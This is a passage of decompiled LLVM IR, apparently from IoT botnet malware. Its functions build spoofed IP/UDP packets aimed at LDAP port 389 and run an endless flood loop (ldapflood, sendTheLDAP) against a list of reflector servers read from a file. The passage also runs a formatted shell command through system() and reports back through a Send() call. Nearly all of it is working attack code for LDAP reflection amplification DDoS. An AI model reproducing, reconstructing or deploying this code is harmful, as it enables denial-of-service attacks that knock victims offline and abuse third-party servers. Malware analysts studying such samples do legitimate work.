  uselistorder i32 %v2_eb68, { 1, 2, 0, 3 }
  uselistorder i32 %v2_eb30, { 1, 0, 2 }
  uselistorder i32 %v1_eb08, { 1, 0, 2, 3 }
  uselistorder i32 %v3_eaf4, { 1, 0 }
  uselistorder i32* %v1_eaec, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_eae8, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v2_eac8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 9, 12, 13, 14, 15, 16, 17, 20, 18, 19, 63, 21, 22, 23, 39, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 13, 11, 12, 26, 14, 20, 15, 16, 17, 18, 19, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_f118, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f100, { 1, 0 }
  uselistorder label %dec_label_pc_f0f8, { 1, 0 }
  uselistorder label %dec_label_pc_f0b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_eebc, { 1, 0 }
  uselistorder label %dec_label_pc_edc0, { 1, 0 }
  uselistorder label %dec_label_pc_eac4, { 1, 0 }
  uselistorder label %dec_label_pc_eaa0, { 1, 0 }
}

define i32 @setup_ldap_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i8 69, i8* %arg1, align 1
  %v3_f1b4 = add i32 %tmp, 1
  %v4_f1b4 = inttoptr i32 %v3_f1b4 to i8*
  store i8 0, i8* %v4_f1b4, align 1
  %v3_f1c0 = add i32 %tmp, 2
  %v4_f1c0 = inttoptr i32 %v3_f1c0 to i16*
  store i16 79, i16* %v4_f1c0, align 2
  %v1_f1cc = call i32 @__GI_htonl(i32 54321)
  %v1_f1e0 = trunc i32 %v1_f1cc to i16
  %v3_f1e0 = add i32 %tmp, 4
  %v4_f1e0 = inttoptr i32 %v3_f1e0 to i16*
  store i16 %v1_f1e0, i16* %v4_f1e0, align 2
  %v3_f1ec = add i32 %tmp, 6
  %v4_f1ec = inttoptr i32 %v3_f1ec to i16*
  store i16 0, i16* %v4_f1ec, align 2
  %v3_f1f8 = add i32 %tmp, 8
  %v4_f1f8 = inttoptr i32 %v3_f1f8 to i8*
  store i8 -1, i8* %v4_f1f8, align 1
  %v3_f204 = add i32 %tmp, 9
  %v4_f204 = inttoptr i32 %v3_f204 to i8*
  store i8 17, i8* %v4_f204, align 1
  %v3_f210 = add i32 %tmp, 10
  %v4_f210 = inttoptr i32 %v3_f210 to i16*
  store i16 0, i16* %v4_f210, align 2
  store i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32), i32* @r0, align 4
  %v2_f218 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32))
  %v2_f224 = add i32 %tmp, 12
  %v3_f224 = inttoptr i32 %v2_f224 to i32*
  store i32 %v2_f218, i32* %v3_f224, align 4
  ret i32 %v2_f218

; uselistorder directives
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_36ff0.153 to i32), { 0, 3, 1, 4, 2, 5 }
}

define i32 @setup_ldap_udp_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_f238 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_f238, i32* @ip, align 4
  %v1_f254 = call i32 @__GI_htons(i32 5678)
  %sext = mul i32 %v1_f254, 65536
  %v1_f258 = sdiv i32 %sext, 65536
  %v1_f264 = trunc i32 %v1_f258 to i16
  store i16 %v1_f264, i16* %arg1, align 2
  %v1_f270 = call i32 @__GI_htons(i32 389)
  %v1_f280 = trunc i32 %v1_f270 to i16
  %v3_f280 = add i32 %tmp, 2
  %v4_f280 = inttoptr i32 %v3_f280 to i16*
  store i16 %v1_f280, i16* %v4_f280, align 2
  %v3_f28c = add i32 %tmp, 6
  %v4_f28c = inttoptr i32 %v3_f28c to i16*
  store i16 0, i16* %v4_f28c, align 2
  %v1_f294 = add i32 %tmp, 8
  store i32 %v1_f294, i32* @r3, align 4
  store i32 %v1_f294, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_37820.418 to i32), i32* @r1, align 4
  store i32 51, i32* @r2, align 4
  %v0_f2a4 = call i32 @memcpy()
  %v1_f2ac = call i32 @__GI_htons(i32 59)
  %v2_f2ac = trunc i32 %v1_f2ac to i16
  %v3_f2bc = add i32 %tmp, 4
  %v4_f2bc = inttoptr i32 %v3_f2bc to i16*
  store i16 %v2_f2ac, i16* %v4_f2bc, align 2
  ret i32 %v1_f2ac
}

define i32 @ldapflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4136 = alloca i32, align 4
  %v2_f310 = ptrtoint i32* %stack_var_-4136 to i32
  %v1_f31c = add i32 %v2_f310, 20
  %v5_f320 = inttoptr i32 %v1_f31c to i16*
  %v3_f33c = add i32 %arg1, 12
  %v4_f33c = inttoptr i32 %v3_f33c to i32*
  %v5_f33c = load i32, i32* %v4_f33c, align 4
  %v1_f348 = add i32 %arg1, 4
  %v2_f348 = inttoptr i32 %v1_f348 to i32*
  %v3_f348 = load i32, i32* %v2_f348, align 4
  %v3_f35c = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_f36c = icmp slt i32 %v3_f35c, 0
  br i1 %v1_f36c, label %dec_label_pc_f374, label %dec_label_pc_f37c

dec_label_pc_f374:                                ; preds = %entry
  %v1_f378 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %entry, %dec_label_pc_f374
  %v2_f380 = call i32 @__GI_time(i32* null)
  %v1_f38c = call i32 @init_rand(i32 %v2_f380)
  store i32 %v2_f310, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v0_f3a8 = call i32 @__GI_memset()
  %v1_f3b0 = bitcast i32* %stack_var_-4136 to i8*
  %v2_f3b0 = call i32 @setup_ldap_ip_header(i8* %v1_f3b0)
  %v2_f3b8 = call i32 @setup_ldap_udp_header(i16* %v5_f320)
  %v0_f3bc = call i32 @rand()
  %v2_f3dc = sdiv i32 %v0_f3bc, 13107
  %tmp33 = mul i32 %v2_f3dc, -65535
  %v2_f400 = add i32 %tmp33, %v0_f3bc
  %fold = add i32 %v2_f400, 64510
  %v3_f428 = urem i32 %fold, 65536
  %v1_f430 = call i32 @__GI_htons(i32 %v3_f428)
  %v1_f440 = trunc i32 %v1_f430 to i16
  store i16 %v1_f440, i16* %v5_f320, align 4
  %v2_f464 = add i32 %v2_f310, 12
  %v3_f464 = inttoptr i32 %v2_f464 to i32*
  store i32 %v5_f33c, i32* %v3_f464, align 4
  %v1_f46c = add i32 %v3_f348, 4
  %v2_f46c = inttoptr i32 %v1_f46c to i32*
  %v3_f46c = load i32, i32* %v2_f46c, align 4
  %v2_f474 = add i32 %v2_f310, 16
  %v3_f474 = inttoptr i32 %v2_f474 to i32*
  store i32 %v3_f46c, i32* %v3_f474, align 4
  %v1_f488 = or i32 %v2_f310, 2
  %v2_f488 = inttoptr i32 %v1_f488 to i16*
  %v3_f488 = load i16, i16* %v2_f488, align 2
  %div = udiv i16 %v3_f488, 2
  %v3_f48c = zext i16 %div to i32
  %v2_f4a0 = bitcast i32* %stack_var_-4136 to i16*
  %v3_f4a0 = call i32 @csum(i16* %v2_f4a0, i32 %v3_f48c)
  %v1_f4b0 = trunc i32 %v3_f4a0 to i16
  %v3_f4b0 = add i32 %v2_f310, 10
  %v4_f4b0 = inttoptr i32 %v3_f4b0 to i16*
  store i16 %v1_f4b0, i16* %v4_f4b0, align 2
  store i32 1, i32* %stack_var_-4156, align 4
  %v2_f4d0 = ptrtoint i32* %stack_var_-4156 to i32
  %v5_f4f0 = call i32 @__GI_setsockopt(i32 %v3_f35c, i32 0, i32 3, i32 %v2_f4d0, i32 4)
  %v1_f4f8 = icmp slt i32 %v5_f4f0, 0
  br i1 %v1_f4f8, label %dec_label_pc_f500, label %dec_label_pc_f508

dec_label_pc_f500:                                ; preds = %dec_label_pc_f37c
  %v1_f504 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_f508

dec_label_pc_f508:                                ; preds = %dec_label_pc_f37c, %dec_label_pc_f500
  %v2_f50c = call i32 @__GI_time(i32* null)
  %v1_f518 = call i32 @init_rand(i32 %v2_f50c)
  %v3_f5a0 = add i32 %v2_f310, 4
  %v4_f5a0 = inttoptr i32 %v3_f5a0 to i16*
  br label %dec_label_pc_f528

dec_label_pc_f528:                                ; preds = %dec_label_pc_f628, %dec_label_pc_f508
  %stack_var_-28.0 = phi i32 [ %v3_f348, %dec_label_pc_f508 ], [ %v3_f568, %dec_label_pc_f628 ]
  %storemerge5 = phi i32 [ 0, %dec_label_pc_f508 ], [ %v1_f630, %dec_label_pc_f628 ]
  %v3_f52c = load i16, i16* %v2_f488, align 2
  %v4_f52c = zext i16 %v3_f52c to i32
  %v6_f560 = call i32 @sendto(i32 %v3_f35c, i32 %v2_f310, i32 %v4_f52c, i32 0, i32 %stack_var_-28.0, i32 16)
  %v1_f568 = add i32 %stack_var_-28.0, 532
  %v2_f568 = inttoptr i32 %v1_f568 to i32*
  %v3_f568 = load i32, i32* %v2_f568, align 4
  %v1_f574 = add i32 %v3_f568, 4
  %v2_f574 = inttoptr i32 %v1_f574 to i32*
  %v3_f574 = load i32, i32* %v2_f574, align 4
  store i32 %v3_f574, i32* %v3_f474, align 4
  %v0_f580 = call i32 @rand_cmwc()
  %v1_f58c = call i32 @__GI_htonl(i32 %v0_f580)
  %v1_f5a0 = trunc i32 %v1_f58c to i16
  store i16 %v1_f5a0, i16* %v4_f5a0, align 4
  %v3_f5b4 = load i16, i16* %v2_f488, align 2
  %div34 = udiv i16 %v3_f5b4, 2
  %v3_f5b8 = zext i16 %div34 to i32
  %v3_f5cc = call i32 @csum(i16* %v2_f4a0, i32 %v3_f5b8)
  %v1_f5dc = trunc i32 %v3_f5cc to i16
  store i16 %v1_f5dc, i16* %v4_f4b0, align 2
  %v2_f5e4 = load i32, i32* @global_var_526bc.176, align 4
  %v1_f5e8 = add i32 %v2_f5e4, 1
  store i32 %v1_f5e8, i32* @global_var_526bc.176, align 4
  %v2_f5f8 = load i32, i32* @global_var_52590.178, align 4
  %tmp = icmp ugt i32 %v2_f5f8, %storemerge5
  br i1 %tmp, label %dec_label_pc_f628, label %dec_label_pc_f60c

dec_label_pc_f60c:                                ; preds = %dec_label_pc_f528
  %v2_f61c = load i32, i32* @global_var_4535c.180, align 4
  %v1_f624 = call i32 @usleep(i32 %v2_f61c)
  br label %dec_label_pc_f628

dec_label_pc_f628:                                ; preds = %dec_label_pc_f528, %dec_label_pc_f60c
  %stack_var_-4168.0 = phi i32 [ %storemerge5, %dec_label_pc_f528 ], [ 0, %dec_label_pc_f60c ]
  %v1_f630 = add i32 %stack_var_-4168.0, 1
  br label %dec_label_pc_f528

; uselistorder directives
  uselistorder i32 %v3_f568, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_f3bc, { 1, 0 }
  uselistorder i32 %v2_f310, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4156, { 1, 0 }
  uselistorder label %dec_label_pc_f628, { 1, 0 }
  uselistorder label %dec_label_pc_f508, { 1, 0 }
  uselistorder label %dec_label_pc_f37c, { 1, 0 }
}

define i32 @sendTheLDAP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 63064, i32* %stack_var_-4, align 4
  %v2_f654 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_f654, i32* @fp, align 4
  %v2_f65c = ptrtoint i32* %stack_var_-1176 to i32
  store i32 %v2_f65c, i32* %r3.global-to-local, align 4
  %v1_f67c = call i32 @mfork(i32 %arg2)
  store i32 %v1_f67c, i32* %r3.global-to-local, align 4
  %v2_f684 = icmp eq i32 %v1_f67c, 0
  br i1 %v2_f684, label %dec_label_pc_f68c, label %dec_label_pc_fd30

dec_label_pc_f68c:                                ; preds = %entry
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 255, i32* %r2.global-to-local, align 4
  %v3_f698 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_f698, i32* %r3.global-to-local, align 4
  %v1_f6a8 = icmp slt i32 %v3_f698, 0
  br i1 %v1_f6a8, label %dec_label_pc_f6b0, label %dec_label_pc_f6b8

dec_label_pc_f6b0:                                ; preds = %dec_label_pc_f68c
  %v1_f6b4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_f6b8

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f68c, %dec_label_pc_f6b0
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v8_f6c0 = icmp sgt i32 %arg3, 5
  br i1 %v8_f6c0, label %dec_label_pc_f6dc, label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %dec_label_pc_f6b8
  store i32 ptrtoint ([113 x i8]* @global_var_37854.423 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_f6d0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([113 x i8]* @global_var_37854.423 to i32))
  %v1_f6d8 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f6b8, %dec_label_pc_f6c4
  %v2_f6e0 = call i32 @__GI_time(i32* null)
  %v1_f6f0 = add i32 %arg4, 24
  store i32 %v1_f6f0, i32* %r3.global-to-local, align 4
  %v1_f6f4 = inttoptr i32 %v1_f6f0 to i32*
  %v2_f6f4 = load i32, i32* %v1_f6f4, align 4
  %v1_f700 = add i32 %arg4, 12
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  %v1_f704 = inttoptr i32 %v1_f700 to i32*
  %v2_f704 = load i32, i32* %v1_f704, align 4
  store i32 %v2_f704, i32* %r3.global-to-local, align 4
  %v1_f708 = inttoptr i32 %v2_f704 to i8*
  %v3_f70c = call i32 @strlen(i8* %v1_f708)
  %v2_f71c = mul i32 %v3_f70c, 5
  %v1_f720 = add i32 %v2_f71c, 160
  store i32 %v1_f720, i32* %r2.global-to-local, align 4
  store i32 1023, i32* %r3.global-to-local, align 4
  %v8_f738 = icmp sgt i32 %v1_f720, 1023
  br i1 %v8_f738, label %dec_label_pc_fd30, label %dec_label_pc_f73c

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f6dc
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  %v2_f748 = load i32, i32* %v1_f704, align 4
  store i32 %v2_f748, i32* @lr, align 4
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  %v2_f754 = load i32, i32* %v1_f704, align 4
  store i32 %v2_f754, i32* @r4, align 4
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  %v2_f760 = load i32, i32* %v1_f704, align 4
  store i32 %v2_f760, i32* %r1.global-to-local, align 4
  store i32 %v1_f700, i32* %r3.global-to-local, align 4
  %v2_f76c = load i32, i32* %v1_f704, align 4
  %v2_f780 = ptrtoint i32* %stack_var_-1112 to i32
  store i32 %v2_f754, i32* %stack_var_-1176, align 4
  store i32 %v2_f780, i32* @r0, align 4
  store i32 %v1_f720, i32* @r1, align 4
  store i32 ptrtoint ([176 x i8]* @global_var_378c8.425 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_f748, i32* %r3.global-to-local, align 4
  %v8_f7a4 = call i32 @__GI_snprintf(i32 %v2_f780, i32 %v1_f720, i32 ptrtoint ([176 x i8]* @global_var_378c8.425 to i32), i32 %v2_f748, i32 %v2_f754, i32 %v2_f760, i32 %v2_f76c)
  store i32 %v2_f780, i32* %r3.global-to-local, align 4
  %v1_f7b4 = call i32 @system(i32 %v2_f780)
  %v2_f7bc = call i32 @__GI_time(i32* null)
  store i32 %v2_f7bc, i32* %r3.global-to-local, align 4
  %v1_f7c8 = call i32 @srand(i32 %v2_f7bc)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_536c4.157, align 4
  store i32 128, i32* %r3.global-to-local, align 4
  %v1_f7f0 = call i32 @malloc(i32 128)
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v1_f7f0, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_f80c = call i32 @__GI_memset()
  %v1_f81c = add i32 %arg4, 16
  store i32 %v1_f81c, i32* %r3.global-to-local, align 4
  %v1_f820 = inttoptr i32 %v1_f81c to i32*
  %v2_f820 = load i32, i32* %v1_f820, align 4
  store i32 %v2_f820, i32* %r3.global-to-local, align 4
  store i32 %v2_f820, i32* @r0, align 4
  %v1_f828 = call i32 @atol(i32 %v2_f820)
  %v1_f838 = add i32 %arg4, 20
  store i32 %v1_f838, i32* %r3.global-to-local, align 4
  %v1_f83c = inttoptr i32 %v1_f838 to i32*
  %v2_f83c = load i32, i32* %v1_f83c, align 4
  store i32 %v2_f83c, i32* %r3.global-to-local, align 4
  store i32 %v2_f83c, i32* @r0, align 4
  %v1_f844 = call i32 @atol(i32 %v2_f83c)
  store i32 0, i32* @global_var_52590.178, align 4
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_37978.430 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32), i32* @r1, align 4
  %v3_f878 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_37978.430 to i32), i32 ptrtoint ([2 x i8]* @global_var_37118.168 to i32))
  store i32 %v3_f878, i32* %r3.global-to-local, align 4
  %v1_f88c = add i32 %v0_f80c, -1
  %v4_f890 = inttoptr i32 %v0_f80c to i8*
  br label %dec_label_pc_f9e4.outer

dec_label_pc_f888:                                ; preds = %dec_label_pc_f9e4
  store i32 %v0_f80c, i32* %r3.global-to-local, align 4
  %v3_f894 = call i32 @strlen(i8* %v4_f890)
  %v2_f89c = add i32 %v1_f88c, %v3_f894
  store i32 %v2_f89c, i32* %r3.global-to-local, align 4
  %v1_f8a0 = inttoptr i32 %v2_f89c to i8*
  %v2_f8a0 = load i8, i8* %v1_f8a0, align 1
  %v3_f8a0 = zext i8 %v2_f8a0 to i32
  store i32 %v3_f8a0, i32* %r3.global-to-local, align 4
  %v7_f8a4 = icmp eq i8 %v2_f8a0, 10
  br i1 %v7_f8a4, label %dec_label_pc_f8d0, label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f888
  store i32 %v0_f80c, i32* %r3.global-to-local, align 4
  store i32 %v1_f88c, i32* @r4, align 4
  %v3_f8b8 = call i32 @strlen(i8* %v4_f890)
  %v0_f8c0 = load i32, i32* @r4, align 4
  %v2_f8c0 = add i32 %v0_f8c0, %v3_f8b8
  store i32 %v2_f8c0, i32* %r3.global-to-local, align 4
  %v1_f8c4 = inttoptr i32 %v2_f8c0 to i8*
  %v2_f8c4 = load i8, i8* %v1_f8c4, align 1
  %v3_f8c4 = zext i8 %v2_f8c4 to i32
  store i32 %v3_f8c4, i32* %r3.global-to-local, align 4
  %v7_f8c8 = icmp eq i8 %v2_f8c4, 13
  br i1 %v7_f8c8, label %dec_label_pc_f8d0, label %dec_label_pc_f9e4

dec_label_pc_f8d0:                                ; preds = %dec_label_pc_f8ac, %dec_label_pc_f888
  store i32 %v0_f80c, i32* %r3.global-to-local, align 4
  store i32 %v1_f88c, i32* @r4, align 4
  %v3_f8dc = call i32 @strlen(i8* %v4_f890)
  %v0_f8e4 = load i32, i32* @r4, align 4
  %v2_f8e4 = add i32 %v0_f8e4, %v3_f8dc
  store i32 %v2_f8e4, i32* %r2.global-to-local, align 4
  %v3_f8ec = inttoptr i32 %v2_f8e4 to i8*
  store i8 0, i8* %v3_f8ec, align 1
  %v2_f8f4 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f8f4, i32* %r3.global-to-local, align 4
  %v2_f8f8 = icmp eq i32 %v2_f8f4, 0
  %v1_f904 = call i32 @malloc(i32 540)
  store i32 %v1_f904, i32* %r3.global-to-local, align 4
  br i1 %v2_f8f8, label %dec_label_pc_f900, label %dec_label_pc_f970

dec_label_pc_f900:                                ; preds = %dec_label_pc_f8d0
  store i32 %v1_f904, i32* %r2.global-to-local, align 4
  store i32 %v1_f904, i32* @global_var_536c4.157, align 4
  store i32 %v1_f904, i32* %r3.global-to-local, align 4
  store i32 %v1_f904, i32* @r0, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_f928 = call i32 @bzero(i32 %v1_f904, i32 16)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r3.global-to-local, align 4
  %v2_f930 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f930, i32* @r4, align 4
  store i32 %v0_f80c, i32* @r0, align 4
  %v1_f938 = call i32 @inet_addr(i32 %v0_f80c)
  %v1_f940 = load i32, i32* @r4, align 4
  %v2_f940 = add i32 %v1_f940, 4
  %v3_f940 = inttoptr i32 %v2_f940 to i32*
  store i32 %v1_f938, i32* %v3_f940, align 4
  %v2_f948 = load i32, i32* @global_var_536c4.157, align 4
  %v2_f954 = add i32 %v2_f948, 532
  %v3_f954 = inttoptr i32 %v2_f954 to i32*
  store i32 %v2_f948, i32* %v3_f954, align 4
  %v2_f95c = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f95c, i32* %r2.global-to-local, align 4
  store i32 %v2_f95c, i32* %r3.global-to-local, align 4
  %v2_f968 = add i32 %v2_f95c, 536
  %v3_f968 = inttoptr i32 %v2_f968 to i32*
  store i32 %v2_f95c, i32* %v3_f968, align 4
  br label %dec_label_pc_f9d8

dec_label_pc_f970:                                ; preds = %dec_label_pc_f8d0
  store i32 %v1_f904, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 540, i32* @r2, align 4
  %v0_f98c = call i32 @__GI_memset()
  store i32 %v0_f80c, i32* @r0, align 4
  %v1_f994 = call i32 @inet_addr(i32 %v0_f80c)
  %v2_f9a0 = add i32 %v1_f904, 4
  %v3_f9a0 = inttoptr i32 %v2_f9a0 to i32*
  store i32 %v1_f994, i32* %v3_f9a0, align 4
  %v2_f9a8 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f9a8, i32* %r2.global-to-local, align 4
  %v2_f9b0 = add i32 %v1_f904, 536
  %v3_f9b0 = inttoptr i32 %v2_f9b0 to i32*
  store i32 %v2_f9a8, i32* %v3_f9b0, align 4
  %v2_f9b8 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f9b8, i32* %r3.global-to-local, align 4
  %v1_f9bc = add i32 %v2_f9b8, 532
  %v2_f9bc = inttoptr i32 %v1_f9bc to i32*
  %v3_f9bc = load i32, i32* %v2_f9bc, align 4
  %v2_f9c4 = add i32 %v1_f904, 532
  %v3_f9c4 = inttoptr i32 %v2_f9c4 to i32*
  store i32 %v3_f9bc, i32* %v3_f9c4, align 4
  %v2_f9cc = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_f9cc, i32* %r2.global-to-local, align 4
  store i32 %v1_f904, i32* %r3.global-to-local, align 4
  %v2_f9d4 = add i32 %v2_f9cc, 532
  %v3_f9d4 = inttoptr i32 %v2_f9d4 to i32*
  store i32 %v1_f904, i32* %v3_f9d4, align 4
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f900, %dec_label_pc_f970
  %v1_f9dc = add i32 %stack_var_-60.0.ph, 1
  store i32 %v1_f9dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9e4.outer

dec_label_pc_f9e4.outer:                          ; preds = %dec_label_pc_f9d8, %dec_label_pc_f73c
  %stack_var_-60.0.ph = phi i32 [ %v1_f9dc, %dec_label_pc_f9d8 ], [ 0, %dec_label_pc_f73c ]
  br label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9e4.outer, %dec_label_pc_f8ac
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_f878, i32* %r2.global-to-local, align 4
  %v3_f9f0 = call i32 @fgets(i32 %v0_f80c, i32 128, i32 %v3_f878)
  store i32 %v3_f9f0, i32* %r3.global-to-local, align 4
  %v2_f9f8 = icmp eq i32 %v3_f9f0, 0
  br i1 %v2_f9f8, label %dec_label_pc_fa00, label %dec_label_pc_f888

dec_label_pc_fa00:                                ; preds = %dec_label_pc_f9e4
  %v2_fa04 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_fa04, i32* %r3.global-to-local, align 4
  %v1_fa08 = add i32 %v2_fa04, 532
  %v2_fa08 = inttoptr i32 %v1_fa08 to i32*
  %v3_fa08 = load i32, i32* %v2_fa08, align 4
  %v3_fa14 = mul i32 %v1_f828, 4
  %v1_fa1c = add i32 %v3_fa14, 14
  %v3_fa20 = and i32 %v1_fa1c, -8
  %v1_fa28 = load i32, i32* @sp, align 4
  %v2_fa28 = sub i32 %v1_fa28, %v3_fa20
  %v1_fa38 = add i32 %v2_fa28, 23
  %v3_fa3c = and i32 %v1_fa38, -8
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_fa5c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_fa5c, i32* %r1.global-to-local, align 4
  %v4_fa60 = add i32 %v2_fa5c, -1104
  %v5_fa60 = inttoptr i32 %v4_fa60 to i16*
  store i16 2, i16* %v5_fa60, align 4
  %v1_fa68 = add i32 %arg4, 4
  store i32 %v1_fa68, i32* %r3.global-to-local, align 4
  %v1_fa6c = inttoptr i32 %v1_fa68 to i32*
  %v2_fa6c = load i32, i32* %v1_fa6c, align 4
  store i32 %v2_fa6c, i32* %r3.global-to-local, align 4
  store i32 %v2_fa6c, i32* @r0, align 4
  %v1_fa74 = call i32 @inet_addr(i32 %v2_fa6c)
  %v2_fa8c = mul i32 %v1_f828, 24
  %v1_fa90 = or i32 %v2_fa8c, 7
  %v1_fa94 = add i32 %v1_fa90, 7
  %v3_fa98 = and i32 %v1_fa94, -8
  %v1_faa0 = load i32, i32* @sp, align 4
  %v2_faa0 = sub i32 %v1_faa0, %v3_fa98
  %v1_faa4 = add i32 %v2_faa0, 16
  store i32 %v1_faa4, i32* %r1.global-to-local, align 4
  %v1_fab0 = add i32 %v2_faa0, 23
  %v3_fab4 = and i32 %v1_fab0, -8
  %v2_fb0c = add i32 %v3_fab4, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_f828, i32* %r3.global-to-local, align 4
  %v5_fba049 = icmp sgt i32 %v1_f828, 0
  br i1 %v5_fba049, label %dec_label_pc_fad4, label %dec_label_pc_fba4

dec_label_pc_fad4:                                ; preds = %dec_label_pc_fa00, %dec_label_pc_fad4
  %storemerge150 = phi i32 [ %v1_fb8c, %dec_label_pc_fad4 ], [ 0, %dec_label_pc_fa00 ]
  %v2_fae4 = mul i32 %storemerge150, 24
  %v2_fae8 = add i32 %v2_fae4, %v3_fab4
  %v2_faf0 = inttoptr i32 %v2_fae8 to i32*
  store i32 %storemerge150, i32* %v2_faf0, align 8
  %v2_fb10 = add i32 %v2_fb0c, %v2_fae4
  store i32 %v1_fa74, i32* %r1.global-to-local, align 4
  %v1_fb24 = inttoptr i32 %v2_fb10 to i32*
  %v3_fb24 = or i32 %v2_fb10, 4
  %v4_fb24 = inttoptr i32 %v3_fb24 to i32*
  %v5_fb24 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_fb24, i32* %v4_fb24, align 4
  %v6_fb24 = add i32 %v2_fb10, 8
  %v7_fb24 = inttoptr i32 %v6_fb24 to i32*
  %v8_fb24 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_fb24, i32* %v7_fb24, align 8
  %v9_fb24 = add i32 %v2_fb10, 12
  %v10_fb24 = inttoptr i32 %v9_fb24 to i32*
  %v11_fb24 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_fb24, i32* %v10_fb24, align 4
  %v2_fb44 = or i32 %v2_fae8, 4
  %v2_fb4c = inttoptr i32 %v2_fb44 to i32*
  store i32 %v3_fa08, i32* %v2_fb4c, align 4
  %v3_fb58 = mul i32 %storemerge150, 4
